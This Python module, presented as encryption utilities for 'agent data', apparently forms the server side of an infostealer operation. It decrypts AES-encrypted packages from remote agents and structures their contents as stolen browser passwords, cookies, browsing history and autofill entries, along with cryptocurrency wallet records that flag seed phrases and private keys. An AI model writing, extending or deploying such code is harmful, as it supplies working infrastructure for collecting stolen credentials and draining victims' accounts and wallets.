"""
Encryption utilities for handling agent data
"""

import base64
import json
import zlib
from typing import Dict, Any, Union, Optional
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import hashlib

from ..config import settings


class EncryptionManager:
    """Manages encryption/decryption of agent data"""
    
    def __init__(self, key: Optional[str] = None):
        """Initialize with AES key"""
        self.key = (key or settings.aes_key).encode('utf-8')
        if len(self.key) != 32:
            # Pad or truncate key to 32 bytes
            self.key = hashlib.sha256(self.key).digest()
    
    def decrypt_aes_256(self, encrypted_data: bytes, iv: bytes) -> bytes:
        """Decrypt data using AES-256-CBC"""
        cipher = Cipher(
            algorithms.AES(self.key),
            modes.CBC(iv),
            backend=default_backend()
        )
        decryptor = cipher.decryptor()
        
        # Decrypt
        decrypted_padded = decryptor.update(encrypted_data) + decryptor.finalize()
        
        # Remove padding
        unpadder = padding.PKCS7(128).unpadder()
        decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
        
        return decrypted
    
    def encrypt_aes_256(self, data: bytes, iv: bytes) -> bytes:
        """Encrypt data using AES-256-CBC"""
        # Add padding
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()
        
        # Encrypt
        cipher = Cipher(
            algorithms.AES(self.key),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        
        return encrypted
    
    def decrypt_agent_data(self, encrypted_package: Union[str, bytes]) -> Dict[str, Any]:
        """
        Decrypt data package from agent
        Expected format: base64(IV + encrypted(compressed(json)))
        """
        try:
            # Decode base64 if string
            if isinstance(encrypted_package, str):
                encrypted_package = base64.b64decode(encrypted_package)
            
            # Extract IV (first 16 bytes)
            iv = encrypted_package[:16]
            encrypted_data = encrypted_package[16:]
            
            # Decrypt
            decrypted_compressed = self.decrypt_aes_256(encrypted_data, iv)
            
            # Decompress
            decrypted_json = zlib.decompress(decrypted_compressed)
            
            # Parse JSON
            return json.loads(decrypted_json.decode('utf-8'))
            
        except Exception as e:
            raise ValueError(f"Failed to decrypt agent data: {str(e)}")
    
    def encrypt_response(self, data: Dict[str, Any]) -> str:
        """
        Encrypt response data for agent
        Returns base64 encoded encrypted package
        """
        try:
            # Convert to JSON
            json_data = json.dumps(data, separators=(',', ':')).encode('utf-8')
            
            # Compress
            compressed = zlib.compress(json_data, level=9)
            
            # Generate IV
            import os
            iv = os.urandom(16)
            
            # Encrypt
            encrypted = self.encrypt_aes_256(compressed, iv)
            
            # Combine IV + encrypted data and encode
            package = iv + encrypted
            return base64.b64encode(package).decode('utf-8')
            
        except Exception as e:
            raise ValueError(f"Failed to encrypt response: {str(e)}")
    
    def hash_data(self, data: Union[str, bytes]) -> str:
        """Generate SHA-256 hash of data"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        return hashlib.sha256(data).hexdigest()
    
    def verify_checksum(self, data: Dict[str, Any], provided_checksum: str) -> bool:
        """Verify data checksum"""
        # Remove checksum from data before verification
        data_copy = data.copy()
        data_copy.pop('checksum', None)
        
        # Calculate checksum
        data_str = json.dumps(data_copy, sort_keys=True, separators=(',', ':'))
        calculated_checksum = self.hash_data(data_str)
        
        return calculated_checksum == provided_checksum


class DataProcessor:
    """Process and validate decrypted agent data"""
    
    @staticmethod
    def validate_agent_data(data: Dict[str, Any]) -> bool:
        """Validate required fields in agent data"""
        required_fields = ['agent_id', 'timestamp', 'data_type']
        return all(field in data for field in required_fields)
    
    @staticmethod
    def extract_browser_data(data: Dict[str, Any]) -> Dict[str, Any]:
        """Extract and structure browser data"""
        browser_data = {
            'passwords': [],
            'cookies': [],
            'history': [],
            'autofill': []
        }
        
        if data.get('data_type') != 'browser':
            return browser_data
        
        content = data.get('content', {})
        
        # Extract passwords
        for item in content.get('logins', []):
            browser_data['passwords'].append({
                'url': item.get('url', ''),
                'username': item.get('username', ''),
                'password': item.get('password', ''),
                'browser': content.get('browser', 'unknown')
            })
        
        # Extract cookies
        for item in content.get('cookies', []):
            browser_data['cookies'].append({
                'host': item.get('host', ''),
                'name': item.get('name', ''),
                'value': item.get('value', ''),
                'path': item.get('path', '/'),
                'secure': item.get('secure', False),
                'httponly': item.get('httponly', False)
            })
        
        # Extract history
        for item in content.get('history', []):
            browser_data['history'].append({
                'url': item.get('url', ''),
                'title': item.get('title', ''),
                'visit_count': item.get('visit_count', 0)
            })
        
        # Extract autofill
        for item in content.get('autofill', []):
            browser_data['autofill'].append({
                'name': item.get('name', ''),
                'value': item.get('value', '')
            })
        
        return browser_data
    
    @staticmethod
    def extract_crypto_data(data: Dict[str, Any]) -> Dict[str, Any]:
        """Extract and structure cryptocurrency wallet data"""
        crypto_data = {
            'wallets': [],
            'total_wallets': 0,
            'has_seeds': False,
            'has_private_keys': False
        }
        
        if data.get('data_type') != 'crypto':
            return crypto_data
        
        content = data.get('content', {})
        
        for wallet_type, wallet_data in content.items():
            if isinstance(wallet_data, dict):
                wallet_info = {
                    'type': wallet_type,
                    'addresses': wallet_data.get('addresses', []),
                    'has_seed': bool(wallet_data.get('seed_phrase')),
                    'has_private_key': bool(wallet_data.get('private_keys')),
                    'networks': wallet_data.get('networks', [])
                }
                
                crypto_data['wallets'].append(wallet_info)
                
                if wallet_info['has_seed']:
                    crypto_data['has_seeds'] = True
                if wallet_info['has_private_key']:
                    crypto_data['has_private_keys'] = True
        
        crypto_data['total_wallets'] = len(crypto_data['wallets'])
        
        return crypto_data
    
    @staticmethod
    def sanitize_data(data: Dict[str, Any]) -> Dict[str, Any]:
        """Remove sensitive data before storing in logs"""
        sanitized = data.copy()
        
        # List of sensitive fields to redact
        sensitive_fields = [
            'password', 'seed_phrase', 'private_key', 'private_keys',
            'mnemonic', 'secret', 'token', 'session'
        ]
        
        def redact_dict(d: dict):
            for key, value in d.items():
                if any(sensitive in key.lower() for sensitive in sensitive_fields):
                    d[key] = "[REDACTED]"
                elif isinstance(value, dict):
                    redact_dict(value)
                elif isinstance(value, list):
                    for item in value:
                        if isinstance(item, dict):
                            redact_dict(item)
        
        redact_dict(sanitized)
        return sanitized


# Global encryption manager instance
encryption_manager = EncryptionManager()


# Helper functions
def decrypt_agent_package(package: Union[str, bytes]) -> Dict[str, Any]:
    """Decrypt and validate agent data package"""
    data = encryption_manager.decrypt_agent_data(package)
    
    if not DataProcessor.validate_agent_data(data):
        raise ValueError("Invalid agent data format")
    
    return data


def process_browser_data(encrypted_package: Union[str, bytes]) -> Dict[str, Any]:
    """Decrypt and process browser data"""
    data = decrypt_agent_package(encrypted_package)
    return DataProcessor.extract_browser_data(data)


def process_crypto_data(encrypted_package: Union[str, bytes]) -> Dict[str, Any]:
    """Decrypt and process cryptocurrency data"""
    data = decrypt_agent_package(encrypted_package)
    return DataProcessor.extract_crypto_data(data)


# Export utilities
__all__ = [
    "EncryptionManager",
    "DataProcessor",
    "encryption_manager",
    "decrypt_agent_package",
    "process_browser_data",
    "process_crypto_data"
]